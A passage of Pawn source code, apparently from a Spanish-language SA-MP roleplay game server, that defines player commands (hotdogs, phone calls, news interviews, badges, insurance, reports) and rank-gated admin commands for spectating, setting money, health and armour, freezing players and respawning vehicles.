	    if(Hotdog[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene un hotdog para comer.");
        new string[64], Float:Health;
        GetPlayerHealth(playerid, Health);
  		SetHP(playerid, Health+2.0);
  		format(string, sizeof(string), "* %s coge un hotdog y se lo come.", PlayerName(playerid));
  		ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
  		cuenta[playerid][cHambre] -= (cuenta[playerid][cHambre] * 25) / 100;
		//cuenta[playerid][pPeso] += 1;
  		Hotdog[playerid] -= 1;
	    return 1;
	}
	command(darhotdog, playerid, params[])
	{
	    new string[128];
	    if(Hotdog[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes un hotdog para dar.");
	    if(!sscanf(params, "u", params[0])){
	    if(dDistanciaJugador(8.0, playerid, params[0])){
	        if(Hotdog[params[0]] < 5){
                format(string, sizeof(string), "* %s le da un hotdog a %s", PlayerName(playerid), PlayerName(params[0]));
  				ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                Mensaje(playerid, COLOR_BLANCO, "* Te han dado un hotdog, utiliza {FF4564}/chotdog {FFFFFF}para comértelo.");
                Hotdog[playerid] -= 1;
				Hotdog[params[0]] += 1;
			} else Mensaje(playerid, COLOR_GRIS2, "Esa persona tiene muchos hotdogs!");
		} else Mensaje(playerid, COLOR_GRIS2, "Esta persona esta muy lejos!");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /darhotdog <PlayerID>");
	    return 1;
	}
	command(colgar, playerid, params[])
    {
        StopCall(playerid);
        return 1;
    }
    command(contestar, playerid, params[])
    {
        if(IsPlayerConnected(playerid))
		{
			if(Mobile[playerid] != 255)
			{
				Mensaje(playerid, COLOR_GRIS2, "* Usted ya esta en una llamada...");
				return 1;
			}
			for(new i=0, _max=GetMaxPlayers();i<_max;i++)
			{
				if(IsPlayerConnected(i))
				{
					if(Mobile[i] == playerid)
					{
					    new string[64];
						Mobile[playerid] = i;
						Mensaje(i, COLOR_GRIS2, "Contestaron la llamada.");
						format(string, sizeof(string), "* %s contesta su teléfono.", PlayerName(playerid));
						SetPlayerAttachedObject(playerid, 0, 18866, 6, 0.03999, 0.00999, 0.00000, -90.00000, 0.00000, 180.00000);
						SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}

				}
			}
		}
        return 1;
    }

command(noticias, playerid, params[]){
	if(EsPeriodista(playerid)){
		if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "No tienes rango suficiente!");
			new car = GetVehicleModel(GetPlayerVehicleID(playerid));
			if(cuenta[playerid][cRango] == 3)
			{
				if(car == 488 || car == 582){
					if(!booleano[TalkingLive]{playerid}){
						booleano[TalkingLive]{playerid} = true;
						Mensaje(playerid, COLOR_BLANCO, "Has entrado en antena, estás hablando para todo San Andreas");
						Mensaje(playerid, COLOR_BLANCO, "Recuerda que solo puedes hablar en un vehículo CNN con ese rango.");
					}else{
						booleano[TalkingLive]{playerid} = false;
						Mensaje(playerid, COLOR_BLANCO, "Estás fuera de antena.");
					}
				}else return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo CNN!");
	    	}else{
				if(!booleano[TalkingLive]{playerid}){
					booleano[TalkingLive]{playerid} = true;
					Mensaje(playerid, COLOR_BLANCO, "Has entrado en antena, estás hablando para todo San Andreas");
				}else{
       				booleano[TalkingLive]{playerid} = false;
			        Mensaje(playerid, COLOR_BLANCO, "Estás fuera de antena.");
				}
			}
		}else return Mensaje(playerid, COLOR_GRIS2, "No eres reportero.");
	return 1;
}

command(entrevista, playerid, params[]){
	new player, string[128];
	if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "No tienes rango suficiente!");
	if(!EsPeriodista(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres reportero.");
	if(!sscanf(params, "u", player)){
		if(IsPlayerConnected(player)){
			if(!booleano[TalkingLive]{player}){
				if(dDistanciaJugador(5.0, playerid, player)){
					if(booleano[Facturing]{playerid})return Mensaje(playerid, COLOR_GRIS2, "Este jugador está ocupado, espere.");
					if(player == playerid)return Mensaje(playerid, COLOR_GRIS, "No puedes entrevistarte ati mismo!");
					format(string, sizeof(string), "* Ofreciste a %s una entrevista", PlayerName(player));
					Mensaje(playerid, COLOR_BLANCO, string);
					format(string, sizeof(string), "* %s te ofrece ser entrevistado.", PlayerName(playerid));
					EnviarPeticion(player, string);
					peticiones[player] = 1;
					LiveOffer[player] = playerid;
					booleano[Facturing]{playerid} = true;
					Interview = 1;
					Interviewer = PlayerName(playerid);
				}else return Mensaje(playerid, COLOR_GRIS, "El jugador está muy lejos!");
			}else{
				booleano[TalkingLive]{player} = false;
				format(string, sizeof(string), "* %s anuló la entrevista a %s", PlayerName(playerid), PlayerName(player));
				Mensaje(player, COLOR_BLANCO, string);
			}
		}else return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
	}else return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /entrevista <ID - Nombre>");
	return 1;
}
command(centrevista, playerid, params[]){
	if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "No tienes rango suficiente!");
	if(EsPeriodista(playerid)){
		new string[80];
		Mensaje(playerid, COLOR_BLANCO, "Cancelaste la entrevista.");
		for(new i=0, t=GetMaxPlayers();i<t;i++){
			if(booleano[TalkingLive]{i}){
				format(string, sizeof(string), "** Entrevistado %s salió de la entrevista.", PlayerName(i));
				Mensaje(i, COLOR_BLANCO, string);
				booleano[TalkingLive]{i} = false;
			}
		}
	}else return Mensaje(playerid, COLOR_GRIS2, "No eres reportero.");
	return 1;
}

	command(desbug, playerid, params[])
	{
        if(IsPlayerConnected(playerid))
        {
		    SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
		    Mensaje(playerid, -1, " {98CDFF}Su cRobolema fue solucionado {FFFFFF}correctamente. {FFA4CB}[Desbug]");
		}
		else Mensaje(playerid, COLOR_GRIS2, " Usted no esta logeado.");
        return 1;
	}
	command(desbugcam, playerid, params[])
	{
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	command(cseguro, playerid, params[])
	{
	    if(cuenta[playerid][cSeguro] == 1)return Mensaje(playerid, COLOR_GRIS2, "Ya tienes seguro del hospital!");
        if(verificarDinero(playerid, 1000))
        {
            if(IsPlayerInRangeOfPoint(playerid, 2.0, -2659.7708, 506.9668, 48.0847))
            {
                cuenta[playerid][cSeguro] = 1;
                pierdeDinero(playerid, 1000);
                Mensaje(playerid, -1, "{FF393E}Hospital: {FFFFFF}Adquiriste el seguro médico de Los Santos.");
                Mensaje(playerid, -1, "{FF393E}Hospital: {FFFFFF}Ahora cuando tengas un accidente te atenderemos en este hospital.");
			}
        }
        return 1;
	}
    command(placa, playerid, params[])
    {
        new string[90];
        if(!sscanf(params, "u", params[0]))
        {
            if(IsPlayerConnected(params[0]))
			{
			    if(!dDistanciaJugador(8.0, playerid, params[0]))return Mensaje(playerid, COLOR_GRIS2, "Muy lejos de el jugador.");
			    if(Team_LSPD(playerid))
				{
				    ClearChatbox(params[0], 7);
    				Mensaje(params[0], COLOR_AZUL_CLARO, "-- Policia de Los Santos --");
				    format(string, sizeof(string), "Nombre: %s - Rango: %s", PlayerName(playerid), PlayerStatInfo[playerid][4]);
				    Mensaje(params[0], COLOR_BLANCO, string);
				    format(string, sizeof(string), "* %s le enseña la placa a %s", PlayerName(playerid), PlayerName(params[0]));
			    	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				}
				else if(Team_FBI(playerid))
				{
				    ClearChatbox(params[0], 7);
				    Mensaje(params[0], COLOR_AZUL_CLARO, "-- Federal Bureau of Investigation --");
					format(string, sizeof(string), "Nombre: %s - Rango: %s", PlayerName(playerid), PlayerStatInfo[playerid][4]);
					Mensaje(params[0], COLOR_BLANCO, string);
				    format(string, sizeof(string), "* %s le enseña la placa a %s", PlayerName(playerid), PlayerName(params[0]));
			    	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				}
				else if(Team_Fort(playerid))
				{
				    ClearChatbox(params[0], 7);
				    Mensaje(params[0], COLOR_AZUL_CLARO, "-- Gobierno Fort Carson --");
					format(string, sizeof(string), "Nombre: %s - Rango: %s", PlayerName(playerid), PlayerStatInfo[playerid][4]);
					Mensaje(params[0], COLOR_BLANCO, string);
				    format(string, sizeof(string), "* %s le enseña la placa a %s", PlayerName(playerid), PlayerName(params[0]));
			    	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				}else  Mensaje(playerid, COLOR_GRIS2, "No tienes una placa!");
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /placa <PlayerID>");
        return 1;
    }
 	command(seguro, playerid, params[]){
 		new string[90];
 		if(cuenta[playerid][cSeguro] == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes un seguro medico.");
        if(!sscanf(params, "u", params[0]))
        {
            if(!dDistanciaJugador(8.0, playerid, params[0]))return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
      		Mensaje(params[0], COLOR_VERDE, "__ Tarjeta de Seguro __");
        	format(string, sizeof(string), "   {FF231E}Nombre: {FFFFFF}%s", PlayerName(playerid));
        	Mensaje(params[0], -1, string);
        	format(string, sizeof(string), "   {FF231E}Clinica: {FFFFFF}Los Santos Medical Center");
	        Mensaje(params[0], -1, string);
         	format(string, sizeof(string), "* %s le muestra su tarjeta de seguro a %s.", PlayerName(playerid), PlayerName(params[0]));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /seguro <PlayerID>");
        return 1;
    }
	command(reportar, playerid, params[])return cmd_re(playerid, params);
    command(re, playerid, params[])
    {
        if(!IsPlayerConnected(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás conectado");
        if(JustReported[playerid] > 0)return Mensaje(playerid, COLOR_GRIS2, "Espere 2 Minutos para enviar otro reporte!");
		if(sscanf(params, "us[64]", params[0], params[1]))return Mensaje(playerid, COLOR_GRIS2, "* Utiliza:: /reportar <playerid> <Razón>");
		if(IsPlayerConnected(params[0]))
        {
            new string[128];
			format(string, sizeof(string), "{FA4E60}Reporte: [ID:%d]%s, Reporta a: [ID:%d]%s", playerid, PlayerName(playerid), params[0], PlayerName(params[0]));
			MensajeAdmin(-1, string, 1);
			format(string, sizeof(string), "{FA4E60}Razon: %s", params[1]);
			MensajeAdmin(-1, string, 1);
			Mensaje(playerid, 0x009D4FFF, "Tu reporte fue enviado con exito a los Administradores y sera procesado!");
			JustReported[playerid] = 2;
			booleano[PlayerNeedsHelp]{playerid} = true;
			SetTimerEx("ReportReset", 120000, false, "i", playerid);
        } else Mensaje(playerid, COLOR_GRIS2, " Ese jugador está desconectado.");
        return 1;
    }

command(duda, playerid, params[])
{
	if(cuenta[playerid][cBanDuda] != 0)return Mensaje(playerid, COLOR_GRIS2, "No puedes utilizar este comando, estas baneado del sistema de dudas!");
	if(sscanf(params, "s[128]", params[0]))return Mensaje(playerid, COLOR_GRIS2, "{E98781}Utiliza: {FFFFFF}/duda <Pregunta>");
	if((!nod) && !booleano[duda]{playerid}){
		new string[128];
		booleano[duda]{playerid} = true;
		booleano[PlayerDuda]{playerid} = true;
		format(string, sizeof(string), "{E98781}» DUDA:{FFFFFF} %s", params[0]);
		MensajeAdmin(-1, string, 1);
		format(string, sizeof(string), "{E98781}» Autor: {FFFFFF}%s (ID:%d). Utilice {E98781}/aduda{FFFFFF} para responder.", PlayerName(playerid), playerid);
		MensajeAdmin(-1, string, 1);
		Mensaje(playerid, -1, "{FFF613}Duda enviada porfavor espere 1 minuto para volver a mandar otra duda.");
		SetTimerEx("EnableQuest", 60000, false, "i", playerid);
	}else return Mensaje(playerid, COLOR_GRIS2, "* Canal de duda desactivado o ya envio una duda, espere 1 Minuto.");
	return 1;
}

    command(solicitaradmin, playerid, params[])
    {
        if(AntiFloodCommand[playerid][0] == 0){
	        if(!IsPlayerConnected(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás conectado");
  			new so[] = "{77F84B}>>{FFFFFF}Ayudante\n{DF2019}>>{FFFFFF}Moderador\n{7BAEFC}>>{FFFFFF}Administrador\n{FF7F00}>>{FFFFFF}Administrador General/Encargado de Facciones\n{DC092F}>>{FFFFFF}Administrador Dueño/Encargado de Staff\n{DC092F}>>{FFFFFF}Scripter\n{DC092F}>>{FFFFFF}Dueño";
			ShowPlayerDialog(playerid, DIALOG_SO, DIALOG_STYLE_LIST, " {BAEC4B}> {FFFFFF}Panel de ayuda.", so, "Solicitar", "Cerrar");
			AntiFloodCommand[playerid][0] = 60;
			return 1;
		}
        return 1;
    }
    command(as, playerid, params[])
	{
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /as <id>");
	    if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS2, "Jugador no está conectado.");
    	if(booleano[PlayerSol]{params[0]}){
	    	new string[128];
 	    	format(string, sizeof(string), "{FFFFFF}AdmWarning: {B3D972}%s {FFFFFF}aceptó la solicitud de [ID:%d] {B39CC8}%s.", PlayerName(playerid), params[0], PlayerName(params[0]));
  	    	MensajeAdmin(-1, string, 1);
   	    	format(string, sizeof(string), "{FFFFFF}* Administrador {B39CC8}%s {FFFFFF}ha aceptado su solicitud {B3D972}/w %d, {FFFFFF}espere un momento.", PlayerName(playerid), playerid);
    	    Mensaje(params[0], -1, string);
    	    booleano[PlayerSol]{params[0]} = false;
    	} else Mensaje(playerid, COLOR_GRIS2, "El jugador no ha echo una solicitud.");
        return 1;
    }

COMMAND:respawngeneral(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 6)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	spawnAutos();
	return 1;
}
COMMAND:sp(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	new jugador, tmp[112];
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /sp [Usuario]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado!");
	switch(IsPlayerInAnyVehicle(jugador))
	{
		case 1:
		{
			TogglePlayerSpectating(playerid, true);
			SetPlayerInterior(playerid, GetPlayerInterior(jugador));
			SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(jugador));
			PlayerSpectateVehicle(playerid, GetPlayerVehicleID(jugador));
			entero[playerid][gSpectea] = jugador;
		}
		case 0:
		{
			TogglePlayerSpectating(playerid, true);
			SetPlayerInterior(playerid, GetPlayerInterior(jugador));
			SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(jugador));
			PlayerSpectatePlayer(playerid, jugador);
			entero[playerid][gSpectea] = jugador;
		}
	}
	//
	new Float:ivida, Float:iarmadura;
	GetPlayerHealth(jugador, ivida);
	GetPlayerArmour(jugador, iarmadura);
	
	format(tmp, sizeof(tmp), "_~n~_~n~_~n~_~n~_~n~_~n~_~n~~w~Nombre: %s - ID: %d~n~~w~Vida: %.2f - Armadura: %.2f", Nombre(jugador), jugador, ivida, iarmadura);
	GameTextForPlayer(playerid, tmp, 20000, 3);
	return 1;
}
COMMAND:spoff(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	
	GameTextForPlayer(playerid, "", 50, 3);
	TogglePlayerSpectating(playerid, false);
	SetPlayerColor(playerid, Color[playerid]);
	entero[playerid][gSpectea] = INVALID_PLAYER_ID;
	return 1;
}
COMMAND:dardinero(playerid, args[])
{
	if(cuenta[playerid][cAdministrador] >= 2014)
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		new usuario, dinero;
		if(sscanf(args, "ud", usuario, dinero))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /dardinero [Usuario] [Monto $]");
		if(!IsPlayerConnected(usuario))return Mensaje(playerid, COLOR_GRIS2, "Este usuario no esta conectado.");
		
		MoneyGiveToPlayer(usuario, dinero);
		new string[126];
		format(string, sizeof(string), "Administrador %s ha dado %d$ a %s", PlayerName(playerid), dinero, PlayerName(usuario));
		AdminMensaje(string);
	}
	return 1;
}
COMMAND:darmoneda(playerid, args[])
{
	if(cuenta[playerid][cAdministrador] >= 2014)
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		new usuario, monto;
		if(sscanf(args, "ud", usuario, monto))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /darmoneda [Usuario] [Monto]");
		if(!IsPlayerConnected(usuario))return Mensaje(playerid, COLOR_GRIS2, "Este usuario no esta conectado.");
		
		cuenta[usuario][cZonaZeroCash] += monto;
		new string[126];
		format(string, sizeof(string), "Administrador %s ha dado %d ZZCASH a %s", PlayerName(playerid), monto, PlayerName(usuario));
		AdminMensaje(string);
	}
	return 1;
}

	command(fijardinero, playerid, params[])
    {
    	if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "ui", params[0], params[1]))
		{
		    if(params[0] != INVALID_PLAYER_ID)
		    {
		        if(cuenta[playerid][cAdministrador] >= 2014)
		        {
		            new string[128], year, month, day;    getdate(year, month, day);
		            MoneyResetToPlayer(params[0]);
		            MoneyGiveToPlayer(params[0], params[1]);
					format(string, 128, "Administrador %s ha fijado el dinero de %s a %d$ ", PlayerName(playerid), PlayerName(params[0]), params[1]);
				 	return AdminMensaje(string);
		        }
		        else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		    }
		    else Mensaje(playerid, COLOR_GRIS2, "ID Inválida");
		}
		else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /fijardinero [ID] [Monto]");
        return 1;
    }
	
COMMAND:sethp(playerid, params[])
{
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	new Float:vida, jugador, tmp[84];
	if(sscanf(params, "uf", jugador, vida))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /sethp [Usuario] [HP]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado!");
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");

	SetHP(jugador, vida);
	format(tmp, sizeof(tmp), "Administrador %s ha establecido a %s %.1f de HP.", PlayerName(playerid), PlayerName(jugador), vida);
	AdminMensaje(tmp);
	return 1;
}
COMMAND:setarmor(playerid, params[])
{
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	new Float:chaleco, jugador, tmp[84];
	if(sscanf(params, "uf", jugador, chaleco))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /setarmor [Usuario] [Armadura]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado!");
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");

	darArmadura(jugador, chaleco);
	format(tmp, sizeof(tmp), "Administrador %s ha establecido a %s %.2f de chaleco.", PlayerName(playerid), PlayerName(jugador), chaleco);
	AdminMensaje(tmp);
	return 1;
}

	command(forzarsubsidio, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        Paydays();
		new string[80];
        format(string, 80, "Administrador: %s ha forzado el subsidio.", PlayerName(playerid));
	    AdminMensaje(string);
        return 1;
    }
    command(loteria, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");

		new string[128];
		format(string, sizeof(string), "{2F99B5}Noticias de la Loteria: {FFFFFF}Hemos empezado la elección de la loteria.");
		OOCOff(COLOR_BLANCO, string);
		Lotto(random(150));
        return 1;
    }
    command(setpayday, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "i", params[0]))
        {
            new string[32];
            PayDayLeft = params[0];
            format(string, sizeof(string), "PayDay left: %d minutes", PayDayLeft);
            Mensaje(playerid, COLOR_GRIS2, string);
        }   else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /setpayday <MinutesLeft>");
        return 1;
    }
    command(check, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!sscanf(params, "u", params[0])){
		    if(params[0] == INVALID_PLAYER_ID)return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		    ShowStats(playerid, params[0]);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /check <ID>");
        return 1;
    }
    command(verjail, playerid, params[]){
		new string[80];
    	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
    	if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
    	if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /checkjail <PlayerID>");
        format(string, sizeof(string), "%s - %d segundos restantes", PlayerName(params[0]), cuenta[params[0]][cTiempoCarcel]);
        Mensaje(playerid, COLOR_GRIS2, string);
        return 1;
 	}
 	command(jaileados, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		Mensaje(playerid, COLOR_VERDE, "| Users en Jail Administrativa |");
 		for(new i=0, _max=GetMaxPlayers();i<_max;i++){
			if(IsPlayerConnected(i)){
			    if(cuenta[i][cCarcel] == 1){
					new string[128];
			        format(string, sizeof(string), "%s - %d minutos (ID: %d)", PlayerName(i), cuenta[i][cTiempoCarcel]/60+1, i);
			        Mensaje(playerid, 0xC0C0C0FF, string);
       			}
			}
        }
		return 1;
	}
     
    command(setint, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!sscanf(params, "ud", params[0], params[1])){
		    if(params[0] == INVALID_PLAYER_ID)return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		    new string[64];
		    SetPlayerInterior(params[0], params[1]);
		    format(string, sizeof(string), "- Interior de %s es ahora %d", PlayerName(params[0]), params[1]);   Mensaje(playerid, COLOR_GRIS2, string);
			return Mensaje(params[0], COLOR_GRIS2, string);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /setint <PlayerID> <Interior>");
        return 1;
    }
    command(setvw, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!sscanf(params, "ud", params[0], params[1])){
		    if(params[0] == INVALID_PLAYER_ID)return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		    new string[64];
		    SetPlayerVirtualWorld(params[0], params[1]);
		    format(string, sizeof(string), "- VirtualWorld de %s es ahora %d", PlayerName(params[0]), params[1]);   Mensaje(playerid, COLOR_GRIS2, string);
			return Mensaje(params[0], COLOR_GRIS2, string);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /setvw <PlayerID> <VirtualWorld>");
        return 1;
    }
    command(congelar, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!sscanf(params, "u", params[0])){
		    if(params[0] == INVALID_PLAYER_ID)return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		    new string[64];
			TogglePlayerControllable(params[0], 0);
			Freezed[params[0]] = 1;
			format(string, sizeof(string), "%s ha congelado a %s", PlayerName(playerid), PlayerName(params[0]));
			Mensaje(params[0], COLOR_ROJO, string);
			return AdminMensaje(string);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /congelar <PlayerID>");
        return 1;
    }
    command(descongelar, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!sscanf(params, "u", params[0]))
		{
		    if(params[0] == INVALID_PLAYER_ID)return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		    new string[64];
			TogglePlayerControllable(params[0], 1);
			Freezed[params[0]] = 0;
			format(string, sizeof(string), "%s ha descongelado a %s", PlayerName(playerid), PlayerName(params[0]));
			Mensaje(params[0], COLOR_ROJO, string);
			return AdminMensaje(string);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /descongelar <PlayerID>");
        return 1;
    }
    command(rtc, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        spawnAuto(GetPlayerVehicleID(playerid));
        RemovePlayerFromVehicle(playerid);
        return TogglePlayerControllable(playerid, 1);
    }
    command(rtcar, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "i", params[0])){
            spawnAuto(params[0]);
            new string[64];
            format(string, sizeof(string), "{B1AAB2}Respawneaste el auto [%d]", params[0]); Mensaje(playerid, -1, string);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /rtcar <VehicleID>");
		return 1;
    }
	command(rac, playerid, params[]){
	    if(!IsPlayerConnected(playerid))return Mensaje(playerid, COLOR_GRIS2, "Primero Conectate!");
	    if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
	    if(cuenta[playerid][cAdministrador] >= 4){
			new bool:unwanted[MAX_VEHICLES];
			for(new player=0; player<MAX_PLAYERS; player++){
            	if(IsPlayerInAnyVehicle(player)){ unwanted[GetPlayerVehicleID(player)]=true; }
     		}
			for(new car=1; car<VEHICULOS_COMPRABLES;car++)
			{
				if(!EsBicicleta(car)){
					if(!unwanted[car]) SetVehicleToRespawn(car);
					SetVehicleParamsEx(car, 0, 0, 0, 0, 0, 0, 0);
					vehiculoEncendido[car] = false;
				}else{
					if(!unwanted[car]){
						SetVehicleToRespawn(car);
					}
					vehiculoEncendido[car] = true;
				}
			}
